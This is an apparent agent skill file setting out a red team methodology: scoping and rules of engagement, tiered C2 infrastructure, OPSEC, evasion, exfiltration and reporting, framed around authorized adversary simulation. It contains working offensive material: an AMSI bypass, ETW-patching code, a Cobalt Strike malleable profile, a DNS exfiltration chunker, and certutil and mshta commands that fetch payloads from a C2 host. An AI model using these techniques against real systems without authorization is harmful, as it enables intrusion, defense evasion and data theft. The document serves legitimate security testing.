---
name: offensive-advanced-redteam
description: "Comprehensive red team operations methodology covering full engagement lifecycle from planning through reporting. Addresses engagement scoping and rules of engagement negotiation, multi-tier C2 infrastructure design with redirectors and domain fronting, malleable traffic profiles and beacon tradecraft, OPSEC discipline including attribution avoidance and indicator management, EDR and AMSI evasion techniques using direct syscalls and unhooking, data collection with chain-of-custody controls, and structured reporting with purple team debrief workflows. Covers assumed-breach, external-to-internal, insider threat, and hybrid physical-cyber engagement scenarios with MITRE ATT&CK mapping throughout. Targets operators planning or executing adversary simulation engagements against mature defenders."
---

# Advanced Red Team Operations

Red team engagements simulate real-world adversaries against an organization's people,
processes, and technology. Unlike penetration tests that maximize vulnerability discovery
in a fixed scope, red team operations test detection and response capabilities by pursuing
specific objectives while evading defenders. You operate under rules of engagement that
define what is in bounds, and every action you take must be deliberate, documented, and
reversible. This skill covers the full engagement lifecycle from initial planning through
final debrief.

## Quick Workflow

1. Negotiate scope, rules of engagement, and deconfliction procedures with the client.
2. Build tiered attack infrastructure with redirectors, aged domains, and valid TLS.
3. Configure C2 profiles to blend with the target's legitimate traffic patterns.
4. Execute the attack chain while maintaining strict OPSEC and logging every action.
5. Collect and stage data with encryption; maintain chain of custody throughout.
6. Evade endpoint and network defenses using tested bypass techniques.
7. Document findings with MITRE ATT&CK mappings and deliver structured reporting.
8. Conduct purple team debrief to validate detection gaps and remediation.

---

## Engagement Planning

Every red team engagement begins with planning that protects both the operator and the
client. Skipping this phase leads to scope disputes, legal exposure, and operational
failures.

### Scope and Objectives

Define what you are testing and what success looks like. Common objective types include
data exfiltration (retrieve specific records from a database), domain dominance (obtain
Domain Admin or equivalent), business process disruption (demonstrate ability to halt a
critical workflow), and physical access (gain entry to a restricted area).

Document explicitly what is out of scope: production systems that cannot tolerate
downtime, third-party SaaS platforms without authorization, destructive actions, and
social engineering of specific individuals (executives, legal counsel).

### Rules of Engagement (ROE)

The ROE is a signed legal document. It must contain:

- **Authorization window**: exact dates and hours of permitted activity.
- **Authorized techniques**: which ATT&CK tactics are permitted (e.g., no physical access, no supply chain attacks).
- **Notification thresholds**: conditions under which you must pause and notify the client (e.g., discovering active threat actor, finding child exploitation material, accidental data destruction).
- **Emergency contacts**: a 24/7 phone number for immediate deconfliction, not just email.
- **Legal shield**: explicit written authorization referencing the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or equivalent local statute.

### Deconfliction

Establish a deconfliction process so defenders can verify whether observed activity is
your operation or a real threat. Common approaches:

- **Trusted agent model**: one or two individuals on the defender side who know the engagement is happening and can confirm or deny your activity via a secure channel.
- **Code word system**: a unique code word embedded in your tooling or traffic that defenders can query the trusted agent about.
- **Deconfliction log**: a timestamped record of every action you take, shared with the trusted agent in near-real-time via an encrypted channel.

```text
# Example deconfliction log entry
2026-08-25T14:32:00Z | OPERATOR: kai | ACTION: lateral-movement
  TARGET: 10.10.5.22 (WORKSTATION-FIN03)
  TECHNIQUE: T1021.006 (Windows Remote Management)
  TOOL: evil-winrm via SOCKS proxy
  NOTES: creds from LSASS dump on WORKSTATION-FIN01
  DECONF-CODE: REDTIGER-4482
```

### Communications Security

All operator communications use end-to-end encrypted channels. Never discuss target
details over unencrypted email or Slack. Use a dedicated encrypted messaging platform
(Signal, Wire, or a self-hosted Matrix instance) for real-time coordination. Transfer
files and logs over mutually authenticated TLS or via GPG-encrypted archives.

---

## Infrastructure Setup

Your infrastructure is what separates a red team engagement from a penetration test
run out of a Kali VM. Invest time in building infrastructure that is resilient,
attributable only to your cover identity, and segmented so that burning one asset does
not compromise the operation. Map infrastructure actions to MITRE ATT&CK Resource
Development (TA0042).

### Tiered Architecture

Segment infrastructure into at least three tiers:

| Tier | Purpose | Burn Tolerance | Example |
|------|---------|----------------|---------|
| T1 - Delivery | Phishing, payload hosting | High (expect burn) | Aged domain + Mailgun |
| T2 - Short-haul C2 | Interactive operator sessions | Medium | VPS + Cloudflare tunnel |
| T3 - Long-haul C2 | Persistence callbacks | Low (protect at all costs) | DNS-over-HTTPS beacon |

Each tier uses separate domains, separate VPS providers, and separate operator accounts.
If T2 is burned, you re-establish interactive access through T3 without re-phishing.

### Domain Aging and Reputation

Register domains at least 14-30 days before the engagement. During the aging period:

```bash
# Set up a basic landing page to build categorization
sudo certbot certonly --standalone -d ops-portal.example.com
echo "<html><body>Coming soon</body></html>" > /var/www/html/index.html

# Submit to categorization services
# Visit: https://sitereview.bluecoat.com/
# Visit: https://www.fortiguard.com/webfilter
# Categorize as "Business" or "Technology" - never "Uncategorized"

# Verify categorization after 7-10 days
curl -s "https://sitereview.bluecoat.com/resource/lookup" \
  -d "url=ops-portal.example.com" | jq .
```

Choose domain names that blend with the target's industry. If the target is a financial
firm, domains resembling fintech SaaS products are more plausible than gaming sites.

### Redirectors and Traffic Filtering

Never expose your team server directly to the internet. Use redirectors that filter
traffic and forward only legitimate beacon callbacks.

```nginx
# /etc/nginx/sites-available/redirector.conf
# Smart redirector: forward only traffic matching your C2 profile
server {
    listen 443 ssl;
    server_name ops-portal.example.com;

    ssl_certificate /etc/letsencrypt/live/ops-portal.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ops-portal.example.com/privkey.pem;

    # Only forward requests with the correct URI and User-Agent
    location /api/v2/session {
        if ($http_user_agent !~* "Microsoft-Delivery-Optimization") {
            return 302 https://www.microsoft.com;
        }
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Everything else redirects to a legitimate site
    location / {
        return 302 https://www.microsoft.com;
    }
}
```

For team server management traffic, use Cloudflare Zero Trust tunnels or SSH tunnels
rather than exposing management ports:

```bash
# Bind team server to localhost only
./teamserver 127.0.0.1 <password> /path/to/malleable.profile

# Create a Cloudflare tunnel for operator access
cloudflared tunnel create redteam-mgmt
cloudflared tunnel route dns redteam-mgmt mgmt.internal-ops.example.com
cloudflared tunnel run --url tcp://127.0.0.1:50050 redteam-mgmt

# Operators connect through the tunnel
# On operator machine:
cloudflared access tcp --hostname mgmt.internal-ops.example.com --url 127.0.0.1:50050
```

### VPS and TLS Certificates

Use VPS providers that accept cryptocurrency or prepaid cards for attribution
resistance. Avoid providers that share infrastructure details freely with law
enforcement without due process. Always use valid TLS certificates from a public CA;
self-signed certificates are trivially fingerprinted by network monitoring.

```bash
# Generate a certificate with certbot
sudo certbot certonly --standalone -d c2.example.com

# Convert to Java Keystore for Cobalt Strike
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem \
  -out c2.pkcs12 -name c2 -passout pass:changeit
keytool -importkeystore -srckeystore c2.pkcs12 -srcstoretype pkcs12 \
  -destkeystore c2.store -deststorepass changeit -srcstorepass changeit
```

---

## C2 Tradecraft

Command and control is the backbone of your operation. Your C2 traffic must blend
with the target's legitimate network activity and survive defender inspection. Map
to MITRE ATT&CK Command and Control (TA0011).

### Malleable Profiles and Traffic Blending

Study the target's legitimate traffic before writing your malleable profile. If the
target is a Microsoft 365 shop, your beacon traffic should resemble Office 365 API
calls. If they use AWS heavily, mimic AWS SDK traffic patterns.

```text
# Cobalt Strike malleable C2 profile excerpt - Microsoft 365 blend
set sleeptime "60000";
set jitter    "37";
set useragent "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)";
set host_stage "false";

https-certificate {
    set keystore "c2.store";
    set password "changeit";
}

http-get {
    set uri "/api/v2.0/me/messages";
    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAiOi...";
        metadata {
            base64url;
            prepend "ocp-client-id=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json; odata.metadata=minimal";
        header "X-MS-Request-Id" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        output {
            base64url;
            prepend "{\"@odata.context\":\"https://outlook.office.com/api/v2.0/$metadata#Me/Messages\",\"value\":[{\"Body\":{\"Content\":\"";
            append "\"}}]}";
            print;
        }
    }
}

http-post {
    set uri "/api/v2.0/me/sendmail";
    client {
        header "Content-Type" "application/json";
        id {
            base64url;
            prepend "client-request-id=";
            header "Cookie";
        }
        output {
            base64url;
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend "{\"status\":\"sent\",\"id\":\"";
            append "\"}";
            print;
        }
    }
}
```

### Sleep, Jitter, and Beacon Management

Never use a zero sleep interval except during active hands-on-keyboard sessions, and
even then prefer 1-3 seconds. For idle beacons, use long sleep intervals with high
jitter to defeat statistical analysis of callback timing.

| Beacon Type | Sleep | Jitter | Use Case |
|-------------|-------|--------|----------|
| Interactive (T2) | 5-10s | 30-50% | Active operator sessions |
| Idle (T2) | 60-300s | 30-50% | Waiting for tasking |
| Long-haul (T3) | 12-24h | 50% | Persistence only |
| Exfiltration | 30-60s | 20% | During data staging |

Set kill dates on every beacon. A forgotten beacon calling back months after the
engagement creates legal liability and confusion for the client.

### Fallback Channels

Design your C2 with fallback channels so that losing one communication path does not
mean losing the implant. A typical fallback chain:

1. Primary: HTTPS to domain A through CDN.
2. Secondary: DNS-over-HTTPS to domain B.
3. Tertiary: DNS TXT record queries to domain C.
4. Emergency: ICMP or raw TCP to a hardcoded IP (last resort, high detection risk).

Configure the implant to attempt each channel in order with exponential backoff. If
all channels fail, the implant should enter a dormant state and retry periodically
rather than generating noisy failed connection attempts.

---

## OPSEC Discipline

OPSEC failures end engagements prematurely. Every action you take leaves traces, and
your job is to minimize, control, and eventually clean those traces. Map to MITRE
ATT&CK Defense Evasion (TA0005).

### Attribution Avoidance

Separate your red team identity from your real identity and from other engagements:

- Use dedicated VPN or Tor for all engagement-related browsing and registration.
- Register domains and VPS under engagement-specific pseudonyms with disposable email addresses.
- Never reuse infrastructure, domains, or tooling across engagements.
- Strip metadata from all files before delivery (EXIF from images, author info from Office documents, build paths from compiled binaries).

```bash
# Strip metadata from a phishing document
exiftool -all= phishing_doc.docx

# Verify no identifying metadata remains
exiftool phishing_doc.docx | grep -iE "author|creator|company|producer"

# Strip build paths from a compiled binary (Linux)
strip --strip-all implant
objcopy --remove-section=.note.gnu.build-id implant
```

### Tool Signature Management

Commercial and open-source tools have known signatures. Modify your tooling to avoid
default indicators:

- **Cobalt Strike**: change the default named pipe patterns, watermark, and process injection techniques. Never use the default profile.
- **Mimikatz**: compile from source with randomized function names and string encryption, or use alternatives like `nanodump`, `PPLdump`, or LSASS dumping via `comsvcs.dll`.
- **Impacket**: modify default service names, pipe names, and banner strings that defenders signature.

### Indicator Management and Cleanup

Maintain a running list of every indicator you introduce to the target environment:
files dropped, registry keys modified, services created, scheduled tasks added, user
accounts created. At engagement end, remove every artifact or provide the client with
a complete list for their own cleanup.

```powershell
# Example cleanup script - remove all operator artifacts
# Run this ONLY after documenting everything in your engagement log

# Remove dropped files
Remove-Item -Force "C:\ProgramData\updater.exe"
Remove-Item -Force "C:\Windows\Temp\debug.log"

# Remove persistence mechanisms
Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -Confirm:$false
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater"

# Remove created accounts
Remove-LocalUser -Name "svc_backup$"

# Clear operator event log entries (provide log of cleared entries to client)
# WARNING: Only do this if explicitly authorized in the ROE
```

---

## Data Handling

Every piece of data you collect during an engagement is sensitive. Mishandling it
creates legal liability and erodes client trust. Map to MITRE ATT&CK Collection
(TA0009) and Exfiltration (TA0010).

### Collection and Encryption

Encrypt all collected data immediately. Never store plaintext credentials, PII, or
sensitive business data on your operator machine or in cloud storage without encryption.

```bash
# Encrypt collected data before transfer
tar czf - loot/ | gpg --symmetric --cipher-algo AES256 \
  --batch --passphrase-file /path/to/engagement.key > loot.tar.gz.gpg

# Transfer via SCP to your secure evidence server
scp loot.tar.gz.gpg operator@evidence.internal:/engagements/2026-CLIENT/

# Verify integrity
sha256sum loot.tar.gz.gpg > loot.tar.gz.gpg.sha256
```

### Staging and Exfiltration

Stage data in a controlled location before exfiltration. Do not exfiltrate directly
from the source system; copy to a staging directory, compress, encrypt, then transfer
through your C2 channel or a dedicated exfiltration path.

For large volumes, use chunked transfer over DNS or split files across multiple
HTTP POST requests to avoid triggering DLP thresholds:

```python
# Chunk a file for exfiltration over DNS TXT queries
import base64, os

def chunk_file(filepath, chunk_size=180):
    with open(filepath, 'rb') as f:
        data = base64.b32encode(f.read()).decode()
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

# Each chunk becomes a DNS query: <chunk>.exfil.example.com
# Reassemble on your DNS server from query logs
```

### Chain of Custody

Maintain a forensic-grade chain of custody for all evidence:

- Hash every file at collection time (SHA-256 minimum).
- Log who accessed the data, when, and why.
- Store evidence on encrypted, access-controlled storage.
- Destroy all client data after the agreed retention period (typically 30-90 days post-report).

---

## Evasion Techniques

Modern enterprise environments deploy EDR, AMSI, ETW-based telemetry, and behavioral
analytics. You need techniques to operate in these environments without triggering
alerts. Map to MITRE ATT&CK Defense Evasion (TA0005).

### AMSI Bypass

The Antimalware Scan Interface (AMSI) inspects PowerShell, VBScript, JScript, and .NET
assembly loads. Bypass it before running any suspicious commands in those contexts.

```powershell
# AMSI bypass via memory patching (patches AmsiScanBuffer to return clean result)
# This is a well-known technique; modify the pattern to avoid static signatures
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

# Alternative: patch the AmsiScanBuffer function directly
# Locate amsi.dll in memory and overwrite the scan function entry point
# with a RET instruction (0xC3) so it returns immediately
```

### ETW Patching

Event Tracing for Windows feeds telemetry to EDR sensors. Patching ETW prevents your
activity from being logged through this channel.

```csharp
// Patch EtwEventWrite in ntdll.dll to neutralize ETW logging
// Find the function address and overwrite with a RET (xC3)
IntPtr ntdll = GetModuleHandle("ntdll.dll");
IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Change memory protection, write 0xC3 (ret), restore protection
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### Unhooking and Direct Syscalls

EDR products hook ntdll.dll functions to monitor API calls. Bypass these hooks by
loading a clean copy of ntdll.dll or using direct syscalls.

```csharp
// Unhooking: read a clean copy of ntdll.dll from disk and overwrite
// the .text section of the loaded ntdll in memory
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Parse PE headers, find .text section, overwrite hooked .text with clean copy
// This removes all EDR inline hooks from ntdll functions

// Direct syscalls: call the kernel directly, bypassing ntdll entirely
// Use tools like SysWhispers3 or HellsGate to resolve syscall numbers at runtime
// Example: NtAllocateVirtualMemory via direct syscall instead of VirtualAllocEx
```

The SysWhispers approach generates assembly stubs that invoke syscalls directly,
completely bypassing any userland hooks. HellsGate and HalosGate resolve syscall
numbers dynamically by reading ntdll.dll's export table at runtime.

### LOLBins and Living Off the Land

Prefer built-in Windows binaries over custom tools. Defenders expect to see these
binaries running and may not alert on them unless the command line arguments are
suspicious.

| LOLBin | Use Case | ATT&CK Technique |
|--------|----------|------------------|
| `certutil.exe` | File download, base64 decode | T1105, T1140 |
| `mshta.exe` | Execute HTA payloads | T1218.005 |
| `rundll32.exe` | Load DLLs, execute exports | T1218.011 |
| `regsvr32.exe` | Execute scriptlets via COM | T1218.010 |
| `wmic.exe` | Process creation, lateral movement | T1047 |
| `bitsadmin.exe` | File download via BITS | T1197 |
| `curl.exe` | File download (Windows 10+) | T1105 |
| `msbuild.exe` | Execute inline C# tasks | T1127.001 |

```powershell
# Download a file using certutil (common LOLBin technique)
certutil -urlcache -split -f https://c2.example.com/payload.bin C:\Windows\Temp\payload.bin

# Execute an HTA payload via mshta
mshta https://c2.example.com/payload.hta

# Use MSBuild to execute inline C# (bypasses application whitelisting)
# Requires a .csproj or .xml file with inline Task containing your code
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## Reporting

The report is the primary deliverable of a red team engagement. It must communicate
findings to both executive leadership and technical defenders.

### Report Structure

Organize the report into distinct sections for different audiences:

1. **Executive summary** (1-2 pages): business impact in non-technical language. What could an attacker achieve? What is the risk to the organization?
2. **Engagement overview**: scope, objectives, timeline, methodology, and any limitations encountered.
3. **Attack narrative**: a chronological walkthrough of the attack chain from initial access through objective completion, with timestamps and screenshots.
4. **Technical findings**: each finding documented with description, affected systems, MITRE ATT&CK mapping, evidence (screenshots, logs), risk rating, and remediation recommendation.
5. **MITRE ATT&CK heat map**: a visual mapping of all techniques used during the engagement, highlighting where detection succeeded and where it failed.
6. **Remediation roadmap**: prioritized list of recommendations, grouped by effort and impact.
7. **Indicator appendix**: complete list of all IOCs introduced during the engagement (IPs, domains, file hashes, user accounts, registry keys).

### Purple Team Debrief

The debrief is where the engagement delivers maximum value. Conduct it within one week
of report delivery while details are fresh.

- Walk through the attack chain step by step with both the red team and blue team present.
- At each step, ask: did the blue team detect this? If yes, how quickly? If no, why not?
- Identify specific detection gaps and map them to logging, alerting, or tooling deficiencies.
- Collaboratively develop detection rules for techniques that evaded monitoring.
- Replay specific techniques in a controlled setting so defenders can tune their tools.

---

## Engagement Scenarios

### Assumed Breach

You start with an initial foothold (a workstation with standard user credentials) and
focus on post-exploitation: lateral movement, privilege escalation, and objective
completion. This tests internal detection and response without spending time on
initial access. Map primarily to TA0008 (Lateral Movement), TA0004 (Privilege
Escalation), and TA0006 (Credential Access).

### External to Internal

Full attack chain from the internet. Includes OSINT, phishing or external exploitation,
initial access, and the complete post-exploitation sequence. Tests the full kill chain
from TA0043 (Reconnaissance) through TA0010 (Exfiltration).

### Insider Threat

Simulate a malicious employee with legitimate credentials and physical access. Focus on
what damage an insider can do: accessing data beyond their role, exfiltrating
intellectual property, or sabotaging systems. Tests data loss prevention, access
controls, and behavioral analytics.

### Physical and Cyber Hybrid

Combine physical intrusion (tailgating, badge cloning, lock picking) with cyber
operations. Plant a network implant (drop box) during physical access and use it as
your initial foothold. Tests physical security controls alongside cyber defenses.

---

## Engagement Cheatsheet

```text
PHASE               KEY ACTIONS                                    ATT&CK TACTIC
-----------------------------------------------------------------------------------
Planning            Scope, ROE, deconfliction, legal auth          --
Infrastructure      Domain aging, VPS, redirectors, TLS            TA0042
Initial Access      Phishing, exploitation, physical               TA0001
Execution           Loader -> minimal implant -> full C2           TA0002
Persistence         Registry, scheduled tasks, DLL hijack          TA0003
Priv Escalation     Token manipulation, UAC bypass, kerberoast     TA0004
Defense Evasion     AMSI bypass, ETW patch, unhook, LOLBins        TA0005
Credential Access   LSASS dump, kerberoast, DCSync                 TA0006
Discovery           AD enumeration, network scanning               TA0007
Lateral Movement    WinRM, SMB, DCOM, RDP hijack                   TA0008
Collection          Stage sensitive data, encrypt                  TA0009
Exfiltration        DNS tunnel, HTTPS chunked, cloud storage       TA0010
C2                  Malleable profiles, sleep/jitter, fallbacks    TA0011
Cleanup             Remove artifacts, verify, document             --
Reporting           Narrative, findings, ATT&CK map, debrief       --
```

```text
OPSEC RULES (NON-NEGOTIABLE)
  - Team server binds to 127.0.0.1 only; all external access via redirector/tunnel
  - Kill dates on every beacon; no exceptions
  - Zero-sleep only during active hands-on-keyboard; 60s+ otherwise
  - Encrypt all collected data immediately; never store plaintext credentials
  - Separate infrastructure per tier; burning T1 must not expose T3
  - Strip metadata from all delivered files
  - Log every action with timestamp, target, technique, and deconfliction code
  - Never reuse infrastructure, domains, or tooling across engagements

INFRASTRUCTURE QUICK REFERENCE
  Redirector:   nginx/apache with URI + User-Agent filtering
  Tunnel:       cloudflared, SSH, or WireGuard to team server localhost
  Domain age:   minimum 14 days; 30 preferred; categorize within first week
  TLS:          Let's Encrypt or commercial CA; never self-signed
  DNS:          separate registrar from hosting; enable WHOIS privacy

C2 PROFILE CHECKLIST
  [ ] host_stage = false (disable staging)
  [ ] sleep/jitter configured per beacon tier
  [ ] User-Agent matches target's legitimate traffic
  [ ] URIs mimic real application endpoints
  [ ] Memory obfuscation enabled (sleep_mask, obfuscate)
  [ ] Valid TLS certificate in keystore
  [ ] Spawn-to process set to legitimate binary (not rundll32)
  [ ] Named pipes randomized (not default CS pattern)
```

---

## Key References

- MITRE ATT&CK Enterprise Matrix: https://attack.mitre.org/matrices/enterprise/
- MITRE ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
- Red Team Operations with Cobalt Strike (Raphael Mudge): https://www.cobaltstrike.com/training
- SpecterOps Red Team Operations courses: https://specterops.io/training
- CISA Red Team Sharing Guide: https://www.cisa.gov/resources-tools/resources/cisa-red-team-sharing-guide
- TIBER-EU Framework (threat-intelligence-based ethical red teaming): https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- LOLBAS Project (Living Off The Land Binaries): https://lolbas-project.github.io/
- SysWhispers3: https://github.com/klezVirus/SysWhispers3
- HellsGate / HalosGate: https://github.com/am0nsec/HellsGate
